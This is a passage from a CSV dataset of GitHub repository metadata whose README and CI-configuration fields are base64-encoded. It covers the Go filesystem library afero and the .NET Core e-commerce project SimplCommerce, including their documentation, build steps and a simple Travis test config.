name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
aXggdHJlZSBtZW1vcnkgc3RvcmVkIGZpbGUKc3lzdGVtIHVzaW5nIEluTWVt
b3J5RmlsZS4KCiMjIE5ldHdvcmsgSW50ZXJmYWNlcwoKIyMjIFNmdHBGcwoK
QWZlcm8gaGFzIGV4cGVyaW1lbnRhbCBzdXBwb3J0IGZvciBzZWN1cmUgZmls
ZSB0cmFuc2ZlciBwcm90b2NvbCAoc2Z0cCkuIFdoaWNoIGNhbgpiZSB1c2Vk
IHRvIHBlcmZvcm0gZmlsZSBvcGVyYXRpb25zIG92ZXIgYSBlbmNyeXB0ZWQg
Y2hhbm5lbC4KCiMjIEZpbHRlcmluZyBCYWNrZW5kcwoKIyMjIEJhc2VQYXRo
RnMKClRoZSBCYXNlUGF0aEZzIHJlc3RyaWN0cyBhbGwgb3BlcmF0aW9ucyB0
byBhIGdpdmVuIHBhdGggd2l0aGluIGFuIEZzLgpUaGUgZ2l2ZW4gZmlsZSBu
YW1lIHRvIHRoZSBvcGVyYXRpb25zIG9uIHRoaXMgRnMgd2lsbCBiZSBwcmVw
ZW5kZWQgd2l0aAp0aGUgYmFzZSBwYXRoIGJlZm9yZSBjYWxsaW5nIHRoZSBz
b3VyY2UgRnMuCgpgYGBnbwpicCA6PSBhZmVyby5OZXdCYXNlUGF0aEZzKGFm
ZXJvLk5ld09zRnMoKSwgIi9iYXNlL3BhdGgiKQpgYGAKCiMjIyBSZWFkT25s
eUZzCgpBIHRoaW4gd3JhcHBlciBhcm91bmQgdGhlIHNvdXJjZSBGcyBwcm92
aWRpbmcgYSByZWFkIG9ubHkgdmlldy4KCmBgYGdvCmZzIDo9IGFmZXJvLk5l
d1JlYWRPbmx5RnMoYWZlcm8uTmV3T3NGcygpKQpfLCBlcnIgOj0gZnMuQ3Jl
YXRlKCIvZmlsZS50eHQiKQovLyBlcnIgPSBzeXNjYWxsLkVQRVJNCmBgYAoK
IyBSZWdleHBGcwoKQSBmaWx0ZXJlZCB2aWV3IG9uIGZpbGUgbmFtZXMsIGFu
eSBmaWxlIE5PVCBtYXRjaGluZwp0aGUgcGFzc2VkIHJlZ2V4cCB3aWxsIGJl
IHRyZWF0ZWQgYXMgbm9uLWV4aXN0aW5nLgpGaWxlcyBub3QgbWF0Y2hpbmcg
dGhlIHJlZ2V4cCBwcm92aWRlZCB3aWxsIG5vdCBiZSBjcmVhdGVkLgpEaXJl
Y3RvcmllcyBhcmUgbm90IGZpbHRlcmVkLgoKYGBgZ28KZnMgOj0gYWZlcm8u
TmV3UmVnZXhwRnMoYWZlcm8uTmV3TWVtTWFwRnMoKSwgcmVnZXhwLk11c3RD
b21waWxlKGBcLnR4dCRgKSkKXywgZXJyIDo9IGZzLkNyZWF0ZSgiL2ZpbGUu
aHRtbCIpCi8vIGVyciA9IHN5c2NhbGwuRU5PRU5UCmBgYAoKIyMjIEh0dHBG
cwoKQWZlcm8gcHJvdmlkZXMgYW4gaHR0cCBjb21wYXRpYmxlIGJhY2tlbmQg
d2hpY2ggY2FuIHdyYXAgYW55IG9mIHRoZSBleGlzdGluZwpiYWNrZW5kcy4K
ClRoZSBIdHRwIHBhY2thZ2UgcmVxdWlyZXMgYSBzbGlnaHRseSBzcGVjaWZp
YyB2ZXJzaW9uIG9mIE9wZW4gd2hpY2gKcmV0dXJucyBhbiBodHRwLkZpbGUg
dHlwZS4KCkFmZXJvIHByb3ZpZGVzIGFuIGh0dHBGcyBmaWxlIHN5c3RlbSB3
aGljaCBzYXRpc2ZpZXMgdGhpcyByZXF1aXJlbWVudC4KQW55IEFmZXJvIEZp
bGVTeXN0ZW0gY2FuIGJlIHVzZWQgYXMgYW4gaHR0cEZzLgoKYGBgZ28KaHR0
cEZzIDo9IGFmZXJvLk5ld0h0dHBGcyg8RXhpc3RpbmdGUz4pCmZpbGVzZXJ2
ZXIgOj0gaHR0cC5GaWxlU2VydmVyKGh0dHBGcy5EaXIoPFBBVEg+KSkpCmh0
dHAuSGFuZGxlKCIvIiwgZmlsZXNlcnZlcikKYGBgCgojIyBDb21wb3NpdGUg
QmFja2VuZHMKCkFmZXJvIHByb3ZpZGVzIHRoZSBhYmlsaXR5IGhhdmUgdHdv
IGZpbGVzeXN0ZW1zIChvciBtb3JlKSBhY3QgYXMgYSBzaW5nbGUKZmlsZSBz
eXN0ZW0uCgojIyMgQ2FjaGVPblJlYWRGcwoKVGhlIENhY2hlT25SZWFkRnMg
d2lsbCBsYXppbHkgbWFrZSBjb3BpZXMgb2YgYW55IGFjY2Vzc2VkIGZpbGVz
IGZyb20gdGhlIGJhc2UKbGF5ZXIgaW50byB0aGUgb3ZlcmxheS4gU3Vic2Vx
dWVudCByZWFkcyB3aWxsIGJlIHB1bGxlZCBmcm9tIHRoZSBvdmVybGF5CmRp
cmVjdGx5IHBlcm1pdHRpbmcgdGhlIHJlcXVlc3QgaXMgd2l0aGluIHRoZSBj
YWNoZSBkdXJhdGlvbiBvZiB3aGVuIGl0IHdhcwpjcmVhdGVkIGluIHRoZSBv
dmVybGF5LgoKSWYgdGhlIGJhc2UgZmlsZXN5c3RlbSBpcyB3cml0ZWFibGUs
IGFueSBjaGFuZ2VzIHRvIGZpbGVzIHdpbGwgYmUKZG9uZSBmaXJzdCB0byB0
aGUgYmFzZSwgdGhlbiB0byB0aGUgb3ZlcmxheSBsYXllci4gV3JpdGUgY2Fs
bHMgdG8gb3BlbiBmaWxlCmhhbmRsZXMgbGlrZSBgV3JpdGUoKWAgb3IgYFRy
dW5jYXRlKClgIHRvIHRoZSBvdmVybGF5IGZpcnN0LgoKVG8gd3JpdGluZyBm
aWxlcyB0byB0aGUgb3ZlcmxheSBvbmx5LCB5b3UgY2FuIHVzZSB0aGUgb3Zl
cmxheSBGcyBkaXJlY3RseSAobm90CnZpYSB0aGUgdW5pb24gRnMpLgoKQ2Fj
aGUgZmlsZXMgaW4gdGhlIGxheWVyIGZvciB0aGUgZ2l2ZW4gdGltZS5EdXJh
dGlvbiwgYSBjYWNoZSBkdXJhdGlvbiBvZiAwCm1lYW5zICJmb3JldmVyIiBt
ZWFuaW5nIHRoZSBmaWxlIHdpbGwgbm90IGJlIHJlLXJlcXVlc3RlZCBmcm9t
IHRoZSBiYXNlIGV2ZXIuCgpBIHJlYWQtb25seSBiYXNlIHdpbGwgbWFrZSB0
aGUgb3ZlcmxheSBhbHNvIHJlYWQtb25seSBidXQgc3RpbGwgY29weSBmaWxl
cwpmcm9tIHRoZSBiYXNlIHRvIHRoZSBvdmVybGF5IHdoZW4gdGhleSdyZSBu
b3QgcHJlc2VudCAob3Igb3V0ZGF0ZWQpIGluIHRoZQpjYWNoaW5nIGxheWVy
LgoKYGBgZ28KYmFzZSA6PSBhZmVyby5OZXdPc0ZzKCkKbGF5ZXIgOj0gYWZl
cm8uTmV3TWVtTWFwRnMoKQp1ZnMgOj0gYWZlcm8uTmV3Q2FjaGVPblJlYWRG
cyhiYXNlLCBsYXllciwgMTAwICogdGltZS5TZWNvbmQpCmBgYAoKIyMjIENv
cHlPbldyaXRlRnMoKQoKVGhlIENvcHlPbldyaXRlRnMgaXMgYSByZWFkIG9u
bHkgYmFzZSBmaWxlIHN5c3RlbSB3aXRoIGEgcG90ZW50aWFsbHkKd3JpdGVh
YmxlIGxheWVyIG9uIHRvcC4KClJlYWQgb3BlcmF0aW9ucyB3aWxsIGZpcnN0
IGxvb2sgaW4gdGhlIG92ZXJsYXkgYW5kIGlmIG5vdCBmb3VuZCB0aGVyZSwg
d2lsbApzZXJ2ZSB0aGUgZmlsZSBmcm9tIHRoZSBiYXNlLgoKQ2hhbmdlcyB0
byB0aGUgZmlsZSBzeXN0ZW0gd2lsbCBvbmx5IGJlIG1hZGUgaW4gdGhlIG92
ZXJsYXkuCgpBbnkgYXR0ZW1wdCB0byBtb2RpZnkgYSBmaWxlIGZvdW5kIG9u
bHkgaW4gdGhlIGJhc2Ugd2lsbCBjb3B5IHRoZSBmaWxlIHRvIHRoZQpvdmVy
bGF5IGxheWVyIGJlZm9yZSBtb2RpZmljYXRpb24gKGluY2x1ZGluZyBvcGVu
aW5nIGEgZmlsZSB3aXRoIGEgd3JpdGFibGUKaGFuZGxlKS4KClJlbW92aW5n
IGFuZCBSZW5hbWluZyBmaWxlcyBwcmVzZW50IG9ubHkgaW4gdGhlIGJhc2Ug
bGF5ZXIgaXMgbm90IGN1cnJlbnRseQpwZXJtaXR0ZWQuIElmIGEgZmlsZSBp
cyBwcmVzZW50IGluIHRoZSBiYXNlIGxheWVyIGFuZCB0aGUgb3ZlcmxheSwg
b25seSB0aGUKb3ZlcmxheSB3aWxsIGJlIHJlbW92ZWQvcmVuYW1lZC4KCmBg
YGdvCgliYXNlIDo9IGFmZXJvLk5ld09zRnMoKQoJcm9CYXNlIDo9IGFmZXJv
Lk5ld1JlYWRPbmx5RnMoYmFzZSkKCXVmcyA6PSBhZmVyby5OZXdDb3B5T25X
cml0ZUZzKHJvQmFzZSwgYWZlcm8uTmV3TWVtTWFwRnMoKSkKCglmaCwgXyA9
IHVmcy5DcmVhdGUoIi9ob21lL3Rlc3QvZmlsZTIudHh0IikKCWZoLldyaXRl
U3RyaW5nKCJUaGlzIGlzIGEgdGVzdCIpCglmaC5DbG9zZSgpCmBgYAoKSW4g
dGhpcyBleGFtcGxlIGFsbCB3cml0ZSBvcGVyYXRpb25zIHdpbGwgb25seSBv
Y2N1ciBpbiBtZW1vcnkgKE1lbU1hcEZzKQpsZWF2aW5nIHRoZSBiYXNlIGZp
bGVzeXN0ZW0gKE9zRnMpIHVudG91Y2hlZC4KCgojIyBEZXNpcmVkL3Bvc3Np
YmxlIGJhY2tlbmRzCgpUaGUgZm9sbG93aW5nIGlzIGEgc2hvcnQgbGlzdCBv
ZiBwb3NzaWJsZSBiYWNrZW5kcyB3ZSBob3BlIHNvbWVvbmUgd2lsbAppbXBs
ZW1lbnQ6CgoqIFNTSAoqIFpJUAoqIFRBUgoqIFMzCgojIEFib3V0IHRoZSBw
cm9qZWN0CgojIyBXaGF0J3MgaW4gdGhlIG5hbWUKCkFmZXJvIGNvbWVzIGZy
b20gdGhlIGxhdGluIHJvb3RzIEFkLUZhY2VyZS4KCioqIkFkIioqIGlzIGEg
cHJlZml4IG1lYW5pbmcgInRvIi4KCioqIkZhY2VyZSIqKiBpcyBhIGZvcm0g
b2YgdGhlIHJvb3QgImZhY2nFjSIgbWFraW5nICJtYWtlIG9yIGRvIi4KClRo
ZSBsaXRlcmFsIG1lYW5pbmcgb2YgYWZlcm8gaXMgInRvIG1ha2UiIG9yICJ0
byBkbyIgd2hpY2ggc2VlbXMgdmVyeSBmaXR0aW5nCmZvciBhIGxpYnJhcnkg
dGhhdCBhbGxvd3Mgb25lIHRvIG1ha2UgZmlsZXMgYW5kIGRpcmVjdG9yaWVz
IGFuZCBkbyB0aGluZ3Mgd2l0aCB0aGVtLgoKVGhlIEVuZ2xpc2ggd29yZCB0
aGF0IHNoYXJlcyB0aGUgc2FtZSByb290cyBhcyBBZmVybyBpcyAiYWZmYWly
Ii4gQWZmYWlyIHNoYXJlcwp0aGUgc2FtZSBjb25jZXB0IGJ1dCBhcyBhIG5v
dW4gaXQgbWVhbnMgInNvbWV0aGluZyB0aGF0IGlzIG1hZGUgb3IgZG9uZSIg
b3IgImFuCm9iamVjdCBvZiBhIHBhcnRpY3VsYXIgdHlwZSIuCgpJdCdzIGFs
c28gbmljZSB0aGF0IHVubGlrZSBzb21lIG9mIG15IG90aGVyIGxpYnJhcmll
cyAoaHVnbywgY29icmEsIHZpcGVyKSBpdApHb29nbGVzIHZlcnkgd2VsbC4K
CiMjIFJlbGVhc2UgTm90ZXMKCiogKiowLjEwLjAqKiAyMDE1LjEyLjEwCiAg
KiBGdWxsIGNvbXBhdGliaWxpdHkgd2l0aCBXaW5kb3dzCiAgKiBJbnRyb2R1
Y3Rpb24gb2YgYWZlcm8gdXRpbGl0aWVzCiAgKiBUZXN0IHN1aXRlIHJld3Jp
dHRlbiB0byB3b3JrIGNyb3NzIHBsYXRmb3JtCiAgKiBOb3JtYWxpemUgcGF0
aHMgZm9yIE1lbU1hcEZzCiAgKiBBZGRpbmcgU3luYyB0byB0aGUgZmlsZSBp
bnRlcmZhY2UKICAqICoqQnJlYWtpbmcgQ2hhbmdlKiogV2FsayBhbmQgUmVh
ZERpciBoYXZlIGNoYW5nZWQgcGFyYW1ldGVyIG9yZGVyCiAgKiBNb3Zpbmcg
dHlwZXMgdXNlZCBieSBNZW1NYXBGcyB0byBhIHN1YnBhY2thZ2UKICAqIEdl
bmVyYWwgYnVnZml4ZXMgYW5kIGltcHJvdmVtZW50cwoqICoqMC45LjAqKiAy
MDE1LjExLjA1CiAgKiBOZXcgV2FsayBmdW5jdGlvbiBzaW1pbGFyIHRvIGZp
bGVwYXRoLldhbGsKICAqIE1lbU1hcEZzLk9wZW5GaWxlIGhhbmRsZXMgT19D
UkVBVEUsIE9fQVBQRU5ELCBPX1RSVU5DCiAgKiBNZW1NYXBGcy5SZW1vdmUg
bm93IHJlYWxseSBkZWxldGVzIHRoZSBmaWxlCiAgKiBJbk1lbW9yeUZpbGUu
UmVhZGRpciBhbmQgUmVhZGRpcm5hbWVzIHdvcmsgY29ycmVjdGx5CiAgKiBJ
bk1lbW9yeUZpbGUgZnVuY3Rpb25zIGxvY2sgaXQgZm9yIGNvbmN1cnJlbnQg
YWNjZXNzCiAgKiBUZXN0IHN1aXRlIGltcHJvdmVtZW50cwoqICoqMC44LjAq
KiAyMDE0LjEwLjI4CiAgKiBGaXJzdCBwdWJsaWMgdmVyc2lvbgogICogSW50
ZXJmYWNlcyBmZWVsIHJlYWR5IGZvciBwZW9wbGUgdG8gYnVpbGQgdXNpbmcK
ICAqIEludGVyZmFjZXMgc2F0aXNmeSBhbGwga25vd24gdXNlcwogICogTWVt
TWFwRnMgcGFzc2VzIHRoZSBtYWpvcml0eSBvZiB0aGUgT1MgdGVzdCBzdWl0
ZQogICogT3NGcyBwYXNzZXMgdGhlIG1ham9yaXR5IG9mIHRoZSBPUyB0ZXN0
IHN1aXRlCgojIyBDb250cmlidXRpbmcKCjEuIEZvcmsgaXQKMi4gQ3JlYXRl
IHlvdXIgZmVhdHVyZSBicmFuY2ggKGBnaXQgY2hlY2tvdXQgLWIgbXktbmV3
LWZlYXR1cmVgKQozLiBDb21taXQgeW91ciBjaGFuZ2VzIChgZ2l0IGNvbW1p
dCAtYW0gJ0FkZCBzb21lIGZlYXR1cmUnYCkKNC4gUHVzaCB0byB0aGUgYnJh
bmNoIChgZ2l0IHB1c2ggb3JpZ2luIG15LW5ldy1mZWF0dXJlYCkKNS4gQ3Jl
YXRlIG5ldyBQdWxsIFJlcXVlc3QKCiMjIENvbnRyaWJ1dG9ycwoKTmFtZXMg
aW4gbm8gcGFydGljdWxhciBvcmRlcjoKCiogW3NwZjEzXShodHRwczovL2dp
dGh1Yi5jb20vc3BmMTMpCiogW2phcXgwcl0oaHR0cHM6Ly9naXRodWIuY29t
L2phcXgwcikKKiBbbWJlcnRzY2hsZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS9t
YmVydHNjaGxlcikKKiBbeG9yLWdhdGVdKGh0dHBzOi8vZ2l0aHViLmNvbS94
b3ItZ2F0ZSkKCiMjIExpY2Vuc2UKCkFmZXJvIGlzIHJlbGVhc2VkIHVuZGVy
IHRoZSBBcGFjaGUgMi4wIGxpY2Vuc2UuIFNlZQpbTElDRU5TRS50eHRdKGh0
dHBzOi8vZ2l0aHViLmNvbS9zcGYxMy9hZmVyby9ibG9iL21hc3Rlci9MSUNF
TlNFLnR4dCkK
",,"c3VkbzogZmFsc2UNCmxhbmd1YWdlOiBnbw0KDQpnbzoNCiAgLSAxLjkNCiAg
LSAiMS4xMCINCiAgLSB0aXANCg0Kb3M6DQogIC0gbGludXgNCiAgLSBvc3gN
Cg0KbWF0cml4Og0KICBhbGxvd19mYWlsdXJlczoNCiAgICAtIGdvOiB0aXAN
CiAgZmFzdF9maW5pc2g6IHRydWUNCg0Kc2NyaXB0Og0KICAtIGdvIGJ1aWxk
DQogIC0gZ28gdGVzdCAtcmFjZSAtdiAuLy4uLg0KDQo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'SimplCommerce',59361967,"b'A simple, cross platform, modularized ecommerce system built on .NET Core'",b'C#',76,2400,,2400,False,b'https://api.github.com/repos/simplcommerce/SimplCommerce/forks',"IyBBIHNpbXBsZSwgY3Jvc3MgcGxhdGZvcm0sIG1vZHVsYXJpemVkIGVjb21t
ZXJjZSBzeXN0ZW0gYnVpbHQgb24gLk5FVCBDb3JlIFshW0pvaW4gdGhlIGNo
YXQgYXQgaHR0cHM6Ly9naXR0ZXIuaW0vc2ltcGxjb21tZXJjZS9TaW1wbENv
bW1lcmNlXShodHRwczovL2JhZGdlcy5naXR0ZXIuaW0vc2ltcGxjb21tZXJj
ZS9TaW1wbENvbW1lcmNlLnN2ZyldKGh0dHBzOi8vZ2l0dGVyLmltL3NpbXBs
Y29tbWVyY2UvU2ltcGxDb21tZXJjZT91dG1fc291cmNlPWJhZGdlJnV0bV9t
ZWRpdW09YmFkZ2UmdXRtX2NhbXBhaWduPXByLWJhZGdlJnV0bV9jb250ZW50
PWJhZGdlKQoKIyMgSGlnaCBsZXZlbCBhcmNoaXRlY3R1cmUKCiFbU2ltcGxl
Q29tbWVyY2UgLSBNb2R1bGFyIGFyY2hpdGVjdHVyZV0oaHR0cHM6Ly9yYXcu
Z2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsY29tbWVyY2UvU2ltcGxDb21t
ZXJjZS9tYXN0ZXIvbW9kdWxhci1hcmNoaXRlY3R1cmUucG5nKQoKIyMgQnVp
bGQgU3RhdHVzCnwgQnVpbGQgc2VydmVyICAgIHwgUGxhdGZvcm0gICAgICAg
fCBTdGF0dXMgICAgICB8CnwtLS0tLS0tLS0tLS0tLS0tLXwtLS0tLS0tLS0t
LS0tLS0tfC0tLS0tLS0tLS0tLS18CnwgQXp1cmUgUGlwZWxpbmVzIHwgQWxs
ICAgICAgICAgICAgfFshW0J1aWxkIFN0YXR1c10oaHR0cHM6Ly9zaW1wbGNv
bW1lcmNlLnZpc3VhbHN0dWRpby5jb20vc2ltcGxjb21tZXJjZS9fYXBpcy9i
dWlsZC9zdGF0dXMvc2ltcGxjb21tZXJjZS5TaW1wbENvbW1lcmNlP2JyYW5j
aE5hbWU9bWFzdGVyKV0oaHR0cHM6Ly9zaW1wbGNvbW1lcmNlLnZpc3VhbHN0
dWRpby5jb20vc2ltcGxjb21tZXJjZS9fYnVpbGQvbGF0ZXN0P2RlZmluaXRp
b25JZD0xJmJyYW5jaE5hbWU9bWFzdGVyKQp8VHJhdmlzICAgICAgICAgICB8
IExpbnV4IC8gTWFjT1MgIHxbIVtCdWlsZCBTdGF0dXNdKGh0dHBzOi8vdHJh
dmlzLWNpLm9yZy9zaW1wbGNvbW1lcmNlL1NpbXBsQ29tbWVyY2Uuc3ZnP2Jy
YW5jaD1tYXN0ZXIpXShodHRwczovL3RyYXZpcy1jaS5vcmcvc2ltcGxjb21t
ZXJjZS9TaW1wbENvbW1lcmNlKSB8CgojIyBPbmxpbmUgZGVtbyAoQXp1cmUg
V2Vic2l0ZSkKLSBTdG9yZSBmcm9udDogaHR0cDovL2RlbW8uc2ltcGxjb21t
ZXJjZS5jb20KLSBBZG1pbmlzdHJhdGlvbjogaHR0cDovL2RlbW8uc2ltcGxj
b21tZXJjZS5jb20vYWRtaW4gRW1haWw6IGFkbWluQHNpbXBsY29tbWVyY2Uu
Y29tIFBhc3N3b3JkOiAxcWF6WkFRIQoKIyMgRG9ja2VyCgpGb3IgdGVzdGlu
ZyBwdXJwb3NlIG9ubHkgYGRvY2tlciBydW4gLXAgNTAwMDo4MCBzaW1wbGNv
bW1lcmNlL2NpLWJ1aWxkYAoKQ29udGludW91cyBkZXBsb3ltZW50OiBodHRw
czovL2NpLnNpbXBsY29tbWVyY2UuY29tCgojIyBWaXN1YWwgU3R1ZGlvIDIw
MTkgYW5kIFNRTCBTZXJ2ZXIKCiMjIyMgUHJlcmVxdWlzaXRlcwoKLSBTUUwg
U2VydmVyCi0gW1Zpc3VhbCBTdHVkaW8gMjAxOSB2ZXJzaW9uID49IDE2LjIg
d2l0aCAuTkVUIENvcmUgU0RLIDMuMC4xMDBdKGh0dHBzOi8vd3d3Lm1pY3Jv
c29mdC5jb20vbmV0L2Rvd25sb2FkL2FsbCkKCiMjIyMgU3RlcHMgdG8gcnVu
CgotIFVwZGF0ZSB0aGUgY29ubmVjdGlvbiBzdHJpbmcgaW4gYXBwc2V0dGlu
Z3MuanNvbiBpbiBTaW1wbENvbW1lcmNlLldlYkhvc3QKLSBCdWlsZCB3aG9s
ZSBzb2x1dGlvbi4KLSBJbiBTb2x1dGlvbiBFeHBsb3JlciwgbWFrZSBzdXJl
IHRoYXQgU2ltcGxDb21tZXJjZS5XZWJIb3N0IGlzIHNlbGVjdGVkIGFzIHRo
ZSBTdGFydHVwIFByb2plY3QKLSBPcGVuIFBhY2thZ2UgTWFuYWdlciBDb25z
b2xlIFdpbmRvdyBhbmQgbWFrZSBzdXJlIHRoYXQgU2ltcGxDb21tZXJjZS5X
ZWJIb3N0IGlzIHNlbGVjdGVkIGFzIERlZmF1bHQgcHJvamVjdC4gVGhlbiB0
eXBlICJVcGRhdGUtRGF0YWJhc2UiIHRoZW4gcHJlc3MgIkVudGVyIi4gVGhp
cyBhY3Rpb24gd2lsbCBjcmVhdGUgZGF0YWJhc2Ugc2NoZW1hLgotIEluIFZp
c3VhbCBTdHVkaW8sIHByZXNzICJDb250cm9sICsgRjUiLgotIFRoZSBiYWNr
LW9mZmljZSBjYW4gYWNjZXNzIHZpYSAvQWRtaW4gdXNpbmcgdGhlIHByZS1j
cmVhdGVkIGFjY291bnQ6IGFkbWluQHNpbXBsY29tbWVyY2UuY29tLCAxcWF6
WkFRIQoKIyMgTWFjL0xpbnV4IHdpdGggUG9zdGdyZVNRTAoKIyMjIyBQcmVy
ZXF1aXNpdGUKCi0gUG9zdGdyZVNRTAotIFsuTkVUIENvcmUgU0RLIDMuMC4x
MDBdKGh0dHBzOi8vd3d3Lm1pY3Jvc29mdC5jb20vbmV0L2Rvd25sb2FkL2Fs
bCkKCiMjIyMgU3RlcHMgdG8gcnVuCgotIFVwZGF0ZSB0aGUgY29ubmVjdGlv
biBzdHJpbmcgaW4gYXBwc2V0dGluZ3MuanNvbiBpbiBTaW1wbENvbW1lcmNl
LldlYkhvc3QuCi0gUnVuIGZpbGUgc2ltcGwtYnVpbGQuc2ggYnkgInN1ZG8g
Li9zaW1wbC1idWlsZC5zaCIuIEZvciB1YnVudHUgMTggInN1ZG8gYmFzaCBz
aW1wbC1idWlsZC5zaCIKLSBJbiB0aGUgdGVybWluYWwsIG5hdmlnYXRlIHRv
IHRoZSAic3JjL1NpbXBsQ29tbWVyY2UuV2ViSG9zdCIgdHlwZSAiZG90bmV0
IHJ1biIgYW5kIGhpdCAiRW50ZXIiLgotIE9wZW4gYnJvd3Nlciwgb3BlbiBo
dHRwOi8vbG9jYWxob3N0OjUwMDAuIFRoZSBiYWNrLW9mZmljZSBjYW4gYWNj
ZXNzIHZpYSAvQWRtaW4gdXNpbmcgdGhlIHByZS1jcmVhdGVkIGFjY291bnQ6
IGFkbWluQHNpbXBsY29tbWVyY2UuY29tLCAxcWF6WkFRIQoKIyMgVGVjaG5v
bG9naWVzIGFuZCBmcmFtZXdvcmtzIHVzZWQ6CgotIEFTUC5ORVQgTVZDIENv
cmUgMy4wCi0gRW50aXR5IEZyYW1ld29yayBDb3JlIDMuMAotIEFTUC5ORVQg
SWRlbnRpdHkgQ29yZSAzLjAKLSBBbmd1bGFyIDEuNi4zCi0gTWVkaWF0UiA3
LjAuMCBmb3IgZG9tYWluIGV2ZW50CgojIyBEb2NzCgpodHRwOi8vZG9jcy5z
aW1wbGNvbW1lcmNlLmNvbQoKIyMgUm9hZG1hcAoKaHR0cHM6Ly9naXRodWIu
Y29tL3NpbXBsY29tbWVyY2UvU2ltcGxDb21tZXJjZS93aWtpL1JvYWRtYXAK
CiMjIEhvdyB0byBjb250cmlidXRlCgotIFN0YXIgdGhpcyBwcm9qZWN0IG9u
IEdpdEh1Yi4KLSBSZXBvcnQgYnVncyBvciBzdWdnZXN0IGZlYXR1cmVzIGJ5
IGNyZWF0ZSBuZXcgaXNzdWVzIG9yIGFkZCBjb21tZW50cyB0byBpc3N1ZXMK
LSBTdWJtaXQgcHVsbCByZXF1ZXN0cwotIFNwcmVhZCB0aGUgd29yZCBieSBi
bG9nZ2luZyBhYm91dCBTaW1wbENvbW1lcmNlIG9yIHNoYXJpbmcgaXQgb24g
c29jaWFsIG5ldHdvcmtzCi0gRG9uYXRlIHVzCgojIyBDb250cmlidXRvcnMK
ClRoaXMgcHJvamVjdCBleGlzdHMgdGhhbmtzIHRvIGFsbCB0aGUgcGVvcGxl
IHdobyBjb250cmlidXRlLgoKPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29t
L3NpbXBsY29tbWVyY2UvU2ltcGxDb21tZXJjZS9ncmFwaHMvY29udHJpYnV0
b3JzIj48aW1nIHNyYz0iaHR0cHM6Ly9vcGVuY29sbGVjdGl2ZS5jb20vc2lt
cGxjb21tZXJjZS9jb250cmlidXRvcnMuc3ZnP3dpZHRoPTg5MCIgdGl0bGU9
ImNvbnRyaWJ1dG9ycyIgYWx0PSJjb250cmlidXRvcnMiIC8+PC9hPgoKIyMg
QmFja2VycwoKTG92ZSBvdXIgd29yayBhbmQgaGVscCB1cyBjb250aW51ZSBv
dXIgYWN0aXZpdGllcz8gW1tCZWNvbWUgYSBiYWNrZXJdKGh0dHBzOi8vb3Bl
bmNvbGxlY3RpdmUuY29tL3NpbXBsY29tbWVyY2UjYmFja2VyKV0KCjxhIGhy
ZWY9Imh0dHBzOi8vb3BlbmNvbGxlY3RpdmUuY29tL3NpbXBsY29tbWVyY2Uj
YmFja2VycyIgdGFyZ2V0PSJfYmxhbmsiPjxpbWcgc3JjPSJodHRwczovL29w
ZW5jb2xsZWN0aXZlLmNvbS9zaW1wbGNvbW1lcmNlL2JhY2tlcnMuc3ZnP3dp
